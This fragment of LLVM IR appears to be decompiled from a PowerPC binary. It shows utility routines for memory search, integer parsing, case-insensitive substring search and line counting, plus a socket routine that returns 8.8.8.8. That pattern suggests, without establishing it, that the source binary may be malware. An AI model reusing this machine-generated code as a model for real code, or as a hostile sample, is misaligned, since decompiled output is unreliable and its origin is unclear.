  %v2_100075a09 = icmp eq i32 %v1_100075a08, 0
  br i1 %v2_100075a09, label %dec_label_pc_100075a4, label %dec_label_pc_10007598.dec_label_pc_10007598_crit_edge

dec_label_pc_10007598.dec_label_pc_10007598_crit_edge: ; preds = %dec_label_pc_10007584, %dec_label_pc_10007598.dec_label_pc_10007598_crit_edge
  %v1_1000759c10 = phi i32 [ %v1_1000759c, %dec_label_pc_10007598.dec_label_pc_10007598_crit_edge ], [ %v1_1000759c6, %dec_label_pc_10007584 ]
  %v0_10007598.pre = load i32, i32* %r0.global-to-local, align 4
  %extract.t = trunc i32 %v0_10007598.pre to i8
  %v2_10007598 = load i32, i32* @r3, align 4
  %v4_10007598 = add i32 %v2_10007598, %v1_1000759c10
  %v5_10007598 = inttoptr i32 %v4_10007598 to i8*
  store i8 %extract.t, i8* %v5_10007598, align 1
  %v0_1000759c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000759c = add i32 %v0_1000759c, 1
  store i32 %v1_1000759c, i32* %r9.global-to-local, align 4
  %v0_100075a0 = load i32, i32* %ctr.global-to-local, align 4
  %v1_100075a0 = add i32 %v0_100075a0, -1
  store i32 %v1_100075a0, i32* %ctr.global-to-local, align 4
  %v2_100075a0 = icmp eq i32 %v1_100075a0, 0
  br i1 %v2_100075a0, label %dec_label_pc_100075a4, label %dec_label_pc_10007598.dec_label_pc_10007598_crit_edge

dec_label_pc_100075a4:                            ; preds = %dec_label_pc_10007598.dec_label_pc_10007598_crit_edge, %dec_label_pc_10007584
  %v0_100075a4 = load i32, i32* @r3, align 4
  ret i32 %v0_100075a4

; uselistorder directives
  uselistorder i32 %v1_100075a0, { 1, 0 }
  uselistorder i32 %v1_1000759c, { 1, 0 }
  uselistorder i32 %v0_10007584, { 0, 2, 1 }
  uselistorder i32* %r9.global-to-local, { 2, 1, 0, 3, 4 }
  uselistorder i32* %ctr.global-to-local, { 2, 1, 0, 3, 4 }
  uselistorder label %dec_label_pc_10007598.dec_label_pc_10007598_crit_edge, { 1, 0 }
}

define i32 @function_100075a8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_100075a8:
  %v3_100075a8 = icmp sgt i32 %arg4, %arg2
  br i1 %v3_100075a8, label %dec_label_pc_100075b4, label %dec_label_pc_100075bc

dec_label_pc_100075b4:                            ; preds = %dec_label_pc_100075d8, %dec_label_pc_100075a8, %dec_label_pc_100075bc
  ret i32 -1

dec_label_pc_100075bc:                            ; preds = %dec_label_pc_100075a8
  %tmp = icmp slt i32 %arg2, 1
  br i1 %tmp, label %dec_label_pc_100075b4, label %dec_label_pc_100075c4

dec_label_pc_100075c4:                            ; preds = %dec_label_pc_100075bc
  br label %dec_label_pc_100075e0

dec_label_pc_100075d4:                            ; preds = %dec_label_pc_100075e0
  br label %dec_label_pc_100075d8

dec_label_pc_100075d8:                            ; preds = %dec_label_pc_100075f8, %dec_label_pc_100075d4
  %v0_100075e01 = phi i32 [ %v1_100075e4, %dec_label_pc_100075f8 ], [ 0, %dec_label_pc_100075d4 ]
  %v1_100075d8 = add i32 %v0_100075fc, 1
  %v1_100075dc = add i32 %v0_100075dc, -1
  %v2_100075dc = icmp eq i32 %v1_100075dc, 0
  br i1 %v2_100075dc, label %dec_label_pc_100075b4, label %dec_label_pc_100075e0

dec_label_pc_100075e0:                            ; preds = %dec_label_pc_100075d8, %dec_label_pc_100075c4
  %v0_100075dc = phi i32 [ %v1_100075dc, %dec_label_pc_100075d8 ], [ %arg2, %dec_label_pc_100075c4 ]
  %v0_100075fc = phi i32 [ %v1_100075d8, %dec_label_pc_100075d8 ], [ 0, %dec_label_pc_100075c4 ]
  %v0_100075e0 = phi i32 [ %v0_100075e01, %dec_label_pc_100075d8 ], [ 0, %dec_label_pc_100075c4 ]
  %v2_100075e0 = add i32 %v0_100075e0, %arg3
  %v3_100075e0 = inttoptr i32 %v2_100075e0 to i8*
  %v4_100075e0 = load i8, i8* %v3_100075e0, align 1
  %v1_100075e4 = add i32 %v0_100075e0, 1
  %v2_100075e8 = add i32 %v0_100075fc, %arg1
  %v3_100075e8 = inttoptr i32 %v2_100075e8 to i8*
  %v4_100075e8 = load i8, i8* %v3_100075e8, align 1
  %v4_100075f0 = icmp eq i8 %v4_100075e8, %v4_100075e0
  br i1 %v4_100075f0, label %dec_label_pc_100075f8, label %dec_label_pc_100075d4

dec_label_pc_100075f8:                            ; preds = %dec_label_pc_100075e0
  %v4_100075ec = icmp eq i32 %v1_100075e4, %arg4
  br i1 %v4_100075ec, label %dec_label_pc_100075fc, label %dec_label_pc_100075d8

dec_label_pc_100075fc:                            ; preds = %dec_label_pc_100075f8
  %v1_100075fc = add i32 %v0_100075fc, 1
  ret i32 %v1_100075fc

; uselistorder directives
  uselistorder i32 %v0_100075e0, { 1, 0 }
  uselistorder label %dec_label_pc_100075b4, { 0, 2, 1 }
}

define i32 @function_10007604(i32 %arg1, i32 %arg2) local_unnamed_addr {
bb:
  %r5.global-to-local = alloca i32, align 4
  %v0_10007604.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_10007604

dec_label_pc_10007604:                            ; preds = %dec_label_pc_10007620, %dec_label_pc_10007604, %bb
  %v0_10007604 = phi i32 [ %v0_10007604.pre, %bb ], [ %v1_10007608, %dec_label_pc_10007604 ], [ %v1_10007608, %dec_label_pc_10007620 ]
  %v1_10007604 = inttoptr i32 %v0_10007604 to i8*
  %v2_10007604 = load i8, i8* %v1_10007604, align 1
  %v1_10007608 = add i32 %v0_10007604, 1
  %v3_10007614 = icmp eq i8 %v2_10007604, 32
  br i1 %v3_10007614, label %dec_label_pc_10007604, label %dec_label_pc_10007620

dec_label_pc_10007620:                            ; preds = %dec_label_pc_10007604
  %v2_10007604.off = add i8 %v2_10007604, -9
  %tmp = icmp ult i8 %v2_10007604.off, 2
  br i1 %tmp, label %dec_label_pc_10007604, label %dec_label_pc_1000762c

dec_label_pc_1000762c:                            ; preds = %dec_label_pc_10007620
  %v3_1000762c = icmp eq i8 %v2_10007604, 45
  br i1 %v3_1000762c, label %dec_label_pc_100076d8, label %dec_label_pc_10007634

dec_label_pc_10007634:                            ; preds = %dec_label_pc_1000762c
  %v3_10007634 = icmp eq i8 %v2_10007604, 43
  br i1 %v3_10007634, label %dec_label_pc_10007730, label %dec_label_pc_1000763c

dec_label_pc_1000763c:                            ; preds = %dec_label_pc_10007634, %dec_label_pc_10007730
  %v0_100076cc26 = phi i32 [ %v1_10007608, %dec_label_pc_10007634 ], [ %v1_10007734, %dec_label_pc_10007730 ]
  %v0_1000765c5.in = phi i8 [ %v2_10007604, %dec_label_pc_10007634 ], [ %v2_10007730, %dec_label_pc_10007730 ]
  br label %dec_label_pc_10007648

dec_label_pc_10007648:                            ; preds = %dec_label_pc_100076d8, %dec_label_pc_1000763c
  %v0_100076cc25 = phi i32 [ %v1_100076e0, %dec_label_pc_100076d8 ], [ %v0_100076cc26, %dec_label_pc_1000763c ]
  %v0_1000765c4.in = phi i8 [ %v2_100076d8, %dec_label_pc_100076d8 ], [ %v0_1000765c5.in, %dec_label_pc_1000763c ]
  %v0_10007720 = phi i32 [ 1, %dec_label_pc_100076d8 ], [ 0, %dec_label_pc_1000763c ]
  %v1_10007658 = phi i32 [ -2147483648, %dec_label_pc_100076d8 ], [ 2147483647, %dec_label_pc_1000763c ]
  %v2_10007648 = udiv i32 %v1_10007658, %arg1
  store i32 0, i32* %r5.global-to-local, align 4
  %v2_10007654 = mul i32 %v2_10007648, %arg1
  %v2_10007658 = sub i32 %v1_10007658, %v2_10007654
  br label %dec_label_pc_1000765c

dec_label_pc_1000765c:                            ; preds = %dec_label_pc_100076cc, %dec_label_pc_10007648
  %v0_100076cc = phi i32 [ %v1_100076d0, %dec_label_pc_100076cc ], [ %v0_100076cc25, %dec_label_pc_10007648 ]
  %v0_100076c0 = phi i32 [ %v0_100076b817, %dec_label_pc_100076cc ], [ 0, %dec_label_pc_10007648 ]
  %v0_100076b0 = phi i32 [ %v0_1000771011, %dec_label_pc_100076cc ], [ 0, %dec_label_pc_10007648 ]
  %v0_100076a8 = phi i32 [ %v0_100077049, %dec_label_pc_100076cc ], [ 0, %dec_label_pc_10007648 ]
  %v1_1000769c.in = phi i8 [ %v2_100076cc, %dec_label_pc_100076cc ], [ %v0_1000765c4.in, %dec_label_pc_10007648 ]
  %v1_1000769c = zext i8 %v1_1000769c.in to i32
  %v1_10007660 = add nsw i32 %v1_1000769c, -48
  %fold = add nuw nsw i32 %v1_1000769c, 208
  %v1_10007668 = urem i32 %fold, 256
  %tmp27 = icmp ult i32 %v1_10007668, 10
  br i1 %tmp27, label %dec_label_pc_100076a0, label %dec_label_pc_10007674

dec_label_pc_10007674:                            ; preds = %dec_label_pc_1000765c
  %v1_10007674 = add nuw nsw i32 %v1_1000769c, 191
  %v1_10007678 = urem i32 %v1_10007674, 256
  %tmp28 = icmp ult i32 %v1_10007678, 26
  br i1 %tmp28, label %dec_label_pc_1000769c, label %dec_label_pc_10007688

dec_label_pc_10007688:                            ; preds = %dec_label_pc_10007674
  %v1_10007688 = add nuw nsw i32 %v1_1000769c, 159
  %v1_1000768c = urem i32 %v1_10007688, 256
  %v2_10007690 = icmp ugt i32 %v1_1000768c, 25
  br i1 %v2_10007690, label %dec_label_pc_10007704, label %dec_label_pc_10007698

dec_label_pc_10007698:                            ; preds = %dec_label_pc_10007688
  br label %dec_label_pc_1000769c

dec_label_pc_1000769c:                            ; preds = %dec_label_pc_10007674, %dec_label_pc_10007698
  %v0_1000769c = phi i32 [ 55, %dec_label_pc_10007674 ], [ 87, %dec_label_pc_10007698 ]
  %v2_1000769c = sub nsw i32 %v1_1000769c, %v0_1000769c
  br label %dec_label_pc_100076a0

dec_label_pc_100076a0:                            ; preds = %dec_label_pc_1000765c, %dec_label_pc_1000769c
  %v1_100076c8 = phi i32 [ %v1_10007660, %dec_label_pc_1000765c ], [ %v2_1000769c, %dec_label_pc_1000769c ]
  %v2_100076a0 = icmp slt i32 %v1_100076c8, %arg1
  br i1 %v2_100076a0, label %dec_label_pc_100076a8, label %dec_label_pc_10007704

dec_label_pc_100076a8:                            ; preds = %dec_label_pc_100076a0
  %v1_100076a8 = icmp slt i32 %v0_100076a8, 0
  br i1 %v1_100076a8, label %dec_label_pc_100076ec, label %dec_label_pc_100076b0

dec_label_pc_100076b0:                            ; preds = %dec_label_pc_100076a8
  %v3_100076b0 = icmp ugt i32 %v0_100076b0, %v2_10007648
  br i1 %v3_100076b0, label %dec_label_pc_100076ec, label %dec_label_pc_100076b8

dec_label_pc_100076b8:                            ; preds = %dec_label_pc_100076b0
  %v4_100076b8 = icmp eq i32 %v0_100076c0, %v2_10007648
  br i1 %v4_100076b8, label %dec_label_pc_100076f4, label %dec_label_pc_100076c0

dec_label_pc_100076c0:                            ; preds = %dec_label_pc_100076f4, %dec_label_pc_100076b8
  %v2_100076c0 = mul i32 %v0_100076c0, %arg1
  %v2_100076c8 = add i32 %v1_100076c8, %v2_100076c0
  store i32 %v2_100076c8, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_100076cc

dec_label_pc_100076cc:                            ; preds = %dec_label_pc_100076f4, %dec_label_pc_100076ec, %dec_label_pc_100076c0
  %v0_100076b817 = phi i32 [ %v2_10007648, %dec_label_pc_100076f4 ], [ %v0_100076c0, %dec_label_pc_100076ec ], [ %v2_100076c8, %dec_label_pc_100076c0 ]
  %v0_1000771011 = phi i32 [ %v2_10007648, %dec_label_pc_100076f4 ], [ %v0_100076b0, %dec_label_pc_100076ec ], [ %v2_100076c8, %dec_label_pc_100076c0 ]
  %v0_100077049 = phi i32 [ -1, %dec_label_pc_100076f4 ], [ -1, %dec_label_pc_100076ec ], [ 1, %dec_label_pc_100076c0 ]
  %v1_100076cc = inttoptr i32 %v0_100076cc to i8*
  %v2_100076cc = load i8, i8* %v1_100076cc, align 1
  %v1_100076d0 = add i32 %v0_100076cc, 1
  br label %dec_label_pc_1000765c

dec_label_pc_100076d8:                            ; preds = %dec_label_pc_1000762c
  %v1_100076d8 = inttoptr i32 %v1_10007608 to i8*
  %v2_100076d8 = load i8, i8* %v1_100076d8, align 1
  %v1_100076e0 = add i32 %v0_10007604, 2
  br label %dec_label_pc_10007648

dec_label_pc_100076ec:                            ; preds = %dec_label_pc_100076b0, %dec_label_pc_100076a8
  br label %dec_label_pc_100076cc

dec_label_pc_100076f4:                            ; preds = %dec_label_pc_100076b8
  %v3_100076f4 = icmp sgt i32 %v1_100076c8, %v2_10007658
  br i1 %v3_100076f4, label %dec_label_pc_100076cc, label %dec_label_pc_100076c0

dec_label_pc_10007704:                            ; preds = %dec_label_pc_100076a0, %dec_label_pc_10007688
  %v1_10007704 = icmp slt i32 %v0_100076a8, 0
  br i1 %v1_10007704, label %dec_label_pc_10007720, label %dec_label_pc_1000770c

dec_label_pc_1000770c:                            ; preds = %dec_label_pc_10007704
  %v3_1000770c = icmp eq i32 %v0_10007720, 0
  %v0_10007714 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000770c, i32 %v0_10007714)
  %v0_10007718 = load i32, i32* %r5.global-to-local, align 4
  %v1_10007718 = sub i32 0, %v0_10007718
  ret i32 %v1_10007718

dec_label_pc_10007720:                            ; preds = %dec_label_pc_10007704
  %v1_10007720 = xor i32 %v0_10007720, 1
  %v2_10007728 = sub nuw i32 -2147483648, %v1_10007720
  ret i32 %v2_10007728

dec_label_pc_10007730:                            ; preds = %dec_label_pc_10007634
  %v1_10007730 = inttoptr i32 %v1_10007608 to i8*
  %v2_10007730 = load i8, i8* %v1_10007730, align 1
  %v1_10007734 = add i32 %v0_10007604, 2
  br label %dec_label_pc_1000763c

; uselistorder directives
  uselistorder i32 %v2_100076c8, { 1, 0, 2 }
  uselistorder i32 %v1_100076c8, { 1, 0, 2 }
  uselistorder i32 %v1_1000769c, { 2, 4, 3, 0, 1 }
  uselistorder i32 %v0_100076c0, { 2, 0, 1 }
  uselistorder i32 %v0_100076cc, { 1, 0 }
  uselistorder i32 %v2_10007648, { 3, 4, 2, 1, 0 }
  uselistorder i32 %v1_10007608, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_10007604, { 1, 0, 3, 2 }
  uselistorder i32* %r5.global-to-local, { 1, 0, 2 }
  uselistorder i32 208, { 1, 0, 2, 3, 4 }
  uselistorder i32 -2147483648, { 1, 0, 2 }
  uselistorder i8 2, { 0, 3, 1, 2 }
  uselistorder i8 32, { 9, 1, 2, 3, 0, 4, 5, 6, 7, 10, 11, 12, 13, 8, 14, 15, 16, 17, 18, 19 }
  uselistorder i32 %arg1, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_100076a0, { 1, 0 }
  uselistorder label %dec_label_pc_1000769c, { 1, 0 }
  uselistorder label %dec_label_pc_1000763c, { 1, 0 }
}

define i32 @function_1000773c(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1000773c:
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r27.global-to-local, align 4
  store i32 %arg2, i32* %r28.global-to-local, align 4
  store i32 %arg3, i32* %r29.global-to-local, align 4
  store i32 0, i32* %r30.global-to-local, align 4
  %v0_10007768 = load i32, i32* @r31, align 4
  store i32 %tmp, i32* @r31, align 4
  br label %dec_label_pc_10007770

dec_label_pc_10007770:                            ; preds = %dec_label_pc_1000779c.dec_label_pc_10007770_crit_edge, %dec_label_pc_1000773c
  %v0_10007774 = phi i32 [ %v0_10007774.pre, %dec_label_pc_1000779c.dec_label_pc_10007770_crit_edge ], [ %arg3, %dec_label_pc_1000773c ]
  %v0_10007770 = phi i32 [ %v1_10007788, %dec_label_pc_1000779c.dec_label_pc_10007770_crit_edge ], [ %tmp, %dec_label_pc_1000773c ]
  store i32 1, i32* @r5, align 4
  store i32 268466048, i32* @lr, align 4
  %v4_1000777c = call i32 @function_10007fa0(i32 %v0_10007774, i32 %v0_10007770, i32 1)
  %v0_10007780 = load i32, i32* @r31, align 4
  %v3_10007784 = icmp eq i32 %v4_1000777c, 1
  %v1_10007788 = add i32 %v0_10007780, 1
  store i32 %v1_10007788, i32* @r31, align 4
  %v0_10007790 = load i32, i32* %r30.global-to-local, align 4
  br i1 %v3_10007784, label %dec_label_pc_10007790, label %dec_label_pc_100077a8

dec_label_pc_10007790:                            ; preds = %dec_label_pc_10007770
  %v1_10007790 = add i32 %v0_10007790, 1
  store i32 %v1_10007790, i32* %r30.global-to-local, align 4
  %v0_10007794 = load i32, i32* %r28.global-to-local, align 4
  %v3_10007794 = icmp sgt i32 %v0_10007794, %v1_10007790
  br i1 %v3_10007794, label %dec_label_pc_1000779c, label %dec_label_pc_100077a8

dec_label_pc_1000779c:                            ; preds = %dec_label_pc_10007790
  %v1_1000779c = inttoptr i32 %v0_10007780 to i8*
  %v2_1000779c = load i8, i8* %v1_1000779c, align 1
  %v3_100077a0 = icmp eq i8 %v2_1000779c, 10
  br i1 %v3_100077a0, label %dec_label_pc_100077a8, label %dec_label_pc_1000779c.dec_label_pc_10007770_crit_edge

dec_label_pc_1000779c.dec_label_pc_10007770_crit_edge: ; preds = %dec_label_pc_1000779c
  %v0_10007774.pre = load i32, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10007770

dec_label_pc_100077a8:                            ; preds = %dec_label_pc_10007770, %dec_label_pc_1000779c, %dec_label_pc_10007790
  %v1_100077b0 = phi i32 [ %v1_10007790, %dec_label_pc_1000779c ], [ %v1_10007790, %dec_label_pc_10007790 ], [ %v0_10007790, %dec_label_pc_10007770 ]
  %tmp12 = icmp slt i32 %v1_100077b0, 0
  %v1_100077a8 = zext i1 %tmp12 to i32
  %v2_100077a8 = ashr i32 %v1_100077b0, 31
  %v3_100077a8 = and i32 %v2_100077a8, -2
  %v4_100077a8 = or i32 %v3_100077a8, %v1_100077a8
  %v2_100077b0 = xor i32 %v4_100077a8, %v1_100077b0
  %v2_100077b8 = sub i32 %v4_100077a8, %v2_100077b0
  %tmp13 = icmp slt i32 %v2_100077b8, 0
  %v1_100077c0 = zext i1 %tmp13 to i32
  %v2_100077c0 = ashr i32 %v2_100077b8, 31
  %v3_100077c0 = and i32 %v2_100077c0, -2
  %v4_100077c0 = or i32 %v3_100077c0, %v1_100077c0
  %v0_100077c8 = load i32, i32* %r27.global-to-local, align 4
  %v2_100077c8 = and i32 %v4_100077c0, %v0_100077c8
  store i32 %v0_10007768, i32* @r31, align 4
  ret i32 %v2_100077c8

; uselistorder directives
  uselistorder i32 %v2_100077b8, { 1, 0 }
  uselistorder i32 %v4_100077a8, { 1, 0 }
  uselistorder i32 %v1_100077b0, { 1, 2, 0 }
  uselistorder i32 %v1_10007788, { 1, 0 }
  uselistorder i8 10, { 6, 7, 8, 0, 1, 2, 3, 4, 5 }
  uselistorder i32 (i32, i32, i32)* @function_10007fa0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_100077a8, { 1, 2, 0 }
}

define i32 @function_100077e0(i32 %arg1) local_unnamed_addr {
dec_label_pc_100077e0:
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v0_100077f8 = load i32, i32* @r31, align 4
  store i32 16, i32* %stack_var_-40, align 4
  %v0_10007800 = call i32 @function_10008484()
  %v2_1000780c = inttoptr i32 %v0_10007800 to i32*
  store i32 0, i32* %v2_1000780c, align 4
  store i32 268466204, i32* @lr, align 4
  %v3_10007818 = call i32 @function_10008b34(i32 2, i32 2, i32 0)
  store i32 %v3_10007818, i32* @r3, align 4
  %v3_10007820 = icmp eq i32 %v3_10007818, -1
  store i32 %v3_10007818, i32* @r31, align 4
  br i1 %v3_10007820, label %dec_label_pc_10007870, label %dec_label_pc_1000783c

dec_label_pc_1000783c:                            ; preds = %dec_label_pc_100077e0
  %v2_100077ec = ptrtoint i32* %stack_var_-36 to i32
  store i32 2, i32* %stack_var_-36, align 4
  store i32 268466260, i32* @lr, align 4
  %v0_10007850 = call i32 @function_10008934()
  %v2_10007858 = ptrtoint i32* %stack_var_-40 to i32
  %v0_1000785c = load i32, i32* @r31, align 4
  store i32 268466276, i32* @lr, align 4
  %v3_10007860 = call i32 @function_10008968(i32 %v0_1000785c, i32 %v2_100077ec, i32 %v2_10007858)
  store i32 268466284, i32* @lr, align 4
  %v0_10007868 = call i32 @function_10007d68()
  br label %dec_label_pc_10007870

dec_label_pc_10007870:                            ; preds = %dec_label_pc_100077e0, %dec_label_pc_1000783c
  %v0_10007870 = phi i32 [ 0, %dec_label_pc_100077e0 ], [ 134744072, %dec_label_pc_1000783c ]
  store i32 %v0_100077f8, i32* @r31, align 4
  ret i32 %v0_10007870

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
  uselistorder i32 ()* @function_10008934, { 7, 5, 6, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_10008b34, { 14, 12, 13, 11, 10, 9, 8, 7, 0, 6, 5, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_10007870, { 1, 0 }
}

define i32 @function_1000788c(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1000788c:
  %tmp = inttoptr i32 %arg3 to i8*
  store i32 %arg3, i32* @r5, align 4
  %tmp16 = ptrtoint i8* %arg1 to i32
  %v3_1000788c = load i8, i8* %tmp, align 1
  %v3_10007898 = icmp eq i8 %v3_1000788c, 0
  br i1 %v3_10007898, label %dec_label_pc_100078b0, label %dec_label_pc_100078a0

dec_label_pc_100078a0:                            ; preds = %dec_label_pc_1000788c, %dec_label_pc_100078a0
  %v0_100078a0 = phi i32 [ %v1_100078a0, %dec_label_pc_100078a0 ], [ 0, %dec_label_pc_1000788c ]
  %v1_100078a0 = add i32 %v0_100078a0, 1
  %v3_100078a4 = add i32 %v1_100078a0, %arg3
  %v4_100078a4 = inttoptr i32 %v3_100078a4 to i8*
  %v5_100078a4 = load i8, i8* %v4_100078a4, align 1
  %v3_100078a8 = icmp eq i8 %v5_100078a4, 0
  br i1 %v3_100078a8, label %dec_label_pc_100078b0, label %dec_label_pc_100078a0

dec_label_pc_100078b0:                            ; preds = %dec_label_pc_100078a0, %dec_label_pc_1000788c
  %v0_100078e011 = phi i32 [ 0, %dec_label_pc_1000788c ], [ %v1_100078a0, %dec_label_pc_100078a0 ]
  %v1_100078b0 = icmp slt i32 %arg2, 0
  %v1_100078b4 = add i32 %arg2, 1
  br i1 %v1_100078b0, label %dec_label_pc_1000792c, label %dec_label_pc_100078c8

dec_label_pc_100078c8:                            ; preds = %dec_label_pc_100078b0, %dec_label_pc_1000792c, %dec_label_pc_10007920
  %v2_100078d48 = phi i32 [ %v1_100078d8, %dec_label_pc_10007920 ], [ 0, %dec_label_pc_1000792c ], [ 0, %dec_label_pc_100078b0 ]
  %v0_100078cc6 = phi i32 [ %v1_100078d0, %dec_label_pc_10007920 ], [ %tmp16, %dec_label_pc_1000792c ], [ %tmp16, %dec_label_pc_100078b0 ]
  %v0_100078c8 = phi i32 [ %v0_10007914, %dec_label_pc_10007920 ], [ 1, %dec_label_pc_1000792c ], [ %v1_100078b4, %dec_label_pc_100078b0 ]
  %v1_100078c8 = add i32 %v0_100078c8, -1
  %v2_100078c8 = icmp eq i32 %v1_100078c8, 0
  br i1 %v2_100078c8, label %dec_label_pc_10007918, label %dec_label_pc_100078cc

dec_label_pc_100078cc:                            ; preds = %dec_label_pc_100078c8, %dec_label_pc_10007910
  %v2_100078d4 = phi i32 [ 0, %dec_label_pc_10007910 ], [ %v2_100078d48, %dec_label_pc_100078c8 ]
  %v0_100078cc = phi i32 [ %v1_100078d0, %dec_label_pc_10007910 ], [ %v0_100078cc6, %dec_label_pc_100078c8 ]
  %v0_10007914 = phi i32 [ %v1_10007914, %dec_label_pc_10007910 ], [ %v1_100078c8, %dec_label_pc_100078c8 ]
  %v1_100078cc = inttoptr i32 %v0_100078cc to i8*
  %v2_100078cc = load i8, i8* %v1_100078cc, align 1
  %v3_100078cc = zext i8 %v2_100078cc to i32
  %v1_100078d0 = add i32 %v0_100078cc, 1
  %v3_100078d4 = add i32 %v2_100078d4, %arg3
  %v4_100078d4 = inttoptr i32 %v3_100078d4 to i8*
  %v5_100078d4 = load i8, i8* %v4_100078d4, align 1
  %v6_100078d4 = zext i8 %v5_100078d4 to i32
  %v1_100078d8 = add i32 %v2_100078d4, 1
  %v1_100078dc = add nuw nsw i32 %v3_100078cc, 191
  %v1_100078e4 = urem i32 %v1_100078dc, 256
  %v2_100078e8 = icmp ugt i32 %v1_100078e4, 25
  %v1_100078ec = add nuw nsw i32 %v6_100078d4, 191
  %v1_100078f0 = urem i32 %v1_100078ec, 256
  %v2_100078f4 = icmp ugt i32 %v1_100078f0, 25
  br i1 %v2_100078e8, label %dec_label_pc_10007900, label %dec_label_pc_100078fc

dec_label_pc_100078fc:                            ; preds = %dec_label_pc_100078cc
  %v1_100078fc = or i32 %v3_100078cc, 96
  br i1 %v2_100078f4, label %dec_label_pc_10007908, label %dec_label_pc_10007904

dec_label_pc_10007900:                            ; preds = %dec_label_pc_100078cc
  br i1 %v2_100078f4, label %dec_label_pc_10007908, label %dec_label_pc_10007904

dec_label_pc_10007904:                            ; preds = %dec_label_pc_100078fc, %dec_label_pc_10007900
  %v0_1000790813 = phi i32 [ %v1_100078fc, %dec_label_pc_100078fc ], [ %v3_100078cc, %dec_label_pc_10007900 ]
  %v1_10007904 = or i32 %v6_100078d4, 96
  br label %dec_label_pc_10007908

dec_label_pc_10007908:                            ; preds = %dec_label_pc_100078fc, %dec_label_pc_10007900, %dec_label_pc_10007904
  %v1_10007908 = phi i32 [ %v6_100078d4, %dec_label_pc_100078fc ], [ %v6_100078d4, %dec_label_pc_10007900 ], [ %v1_10007904, %dec_label_pc_10007904 ]
  %v0_10007908 = phi i32 [ %v1_100078fc, %dec_label_pc_100078fc ], [ %v3_100078cc, %dec_label_pc_10007900 ], [ %v0_1000790813, %dec_label_pc_10007904 ]
  %v4_10007908 = icmp eq i32 %v0_10007908, %v1_10007908
  br i1 %v4_10007908, label %dec_label_pc_10007920, label %dec_label_pc_10007910

dec_label_pc_10007910:                            ; preds = %dec_label_pc_10007908
  %v1_10007914 = add i32 %v0_10007914, -1
  %v2_10007914 = icmp eq i32 %v1_10007914, 0
  br i1 %v2_10007914, label %dec_label_pc_10007918, label %dec_label_pc_100078cc

dec_label_pc_10007918:                            ; preds = %dec_label_pc_100078c8, %dec_label_pc_10007910
  ret i32 -1

dec_label_pc_10007920:                            ; preds = %dec_label_pc_10007908
  %v4_100078e0.le = icmp eq i32 %v0_100078e011, %v1_100078d8
  br i1 %v4_100078e0.le, label %dec_label_pc_10007924, label %dec_label_pc_100078c8

dec_label_pc_10007924:                            ; preds = %dec_label_pc_10007920
  %v2_10007924 = sub i32 %v1_100078d0, %tmp16
  ret i32 %v2_10007924

dec_label_pc_1000792c:                            ; preds = %dec_label_pc_100078b0
  br label %dec_label_pc_100078c8

; uselistorder directives
  uselistorder i32 %v1_10007914, { 1, 0 }
  uselistorder i32 %v1_100078fc, { 1, 0 }
  uselistorder i1 %v2_100078f4, { 1, 0 }
  uselistorder i32 %v1_100078d8, { 1, 0 }
  uselistorder i32 %v3_100078cc, { 1, 0, 2, 3 }
  uselistorder i32 %v0_10007914, { 1, 0 }
  uselistorder i32 %v0_100078cc, { 1, 0 }
  uselistorder i32 %v2_100078d4, { 1, 0 }
  uselistorder i32 %tmp16, { 2, 0, 1 }
  uselistorder i32 25, { 7, 8, 9, 3, 4, 6, 0, 5, 1, 2, 10, 11, 12 }
  uselistorder i32 191, { 1, 0, 2 }
  uselistorder i32 %arg3, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_10007918, { 1, 0 }
  uselistorder label %dec_label_pc_10007908, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10007904, { 1, 0 }
  uselistorder label %dec_label_pc_100078cc, { 1, 0 }
  uselistorder label %dec_label_pc_100078c8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_100078a0, { 1, 0 }
}

define i32 @function_10007938(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10007938:
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_10007938 = load i8, i8* %arg1, align 1
  %v3_10007940 = icmp eq i8 %v2_10007938, 0
  br i1 %v3_10007940, label %dec_label_pc_10007958, label %dec_label_pc_10007948

dec_label_pc_10007948:                            ; preds = %dec_label_pc_10007938, %dec_label_pc_10007948
  %v0_10007948 = phi i32 [ %v1_10007948, %dec_label_pc_10007948 ], [ 0, %dec_label_pc_10007938 ]
  %v1_10007948 = add i32 %v0_10007948, 1
  %v2_1000794c = add i32 %v1_10007948, %tmp
  %v3_1000794c = inttoptr i32 %v2_1000794c to i8*
  %v4_1000794c = load i8, i8* %v3_1000794c, align 1
  %v3_10007950 = icmp eq i8 %v4_1000794c, 0
  br i1 %v3_10007950, label %dec_label_pc_10007958, label %dec_label_pc_10007948

dec_label_pc_10007958:                            ; preds = %dec_label_pc_10007948, %dec_label_pc_10007938
  %v0_10007978 = phi i32 [ 0, %dec_label_pc_10007938 ], [ %v1_10007948, %dec_label_pc_10007948 ]
  %v1_10007958 = inttoptr i32 %arg2 to i8*
  %v2_10007958 = load i8, i8* %v1_10007958, align 1
  %v3_10007960 = icmp eq i8 %v2_10007958, 0
  br i1 %v3_10007960, label %dec_label_pc_10007978, label %dec_label_pc_10007968

dec_label_pc_10007968:                            ; preds = %dec_label_pc_10007958, %dec_label_pc_10007968
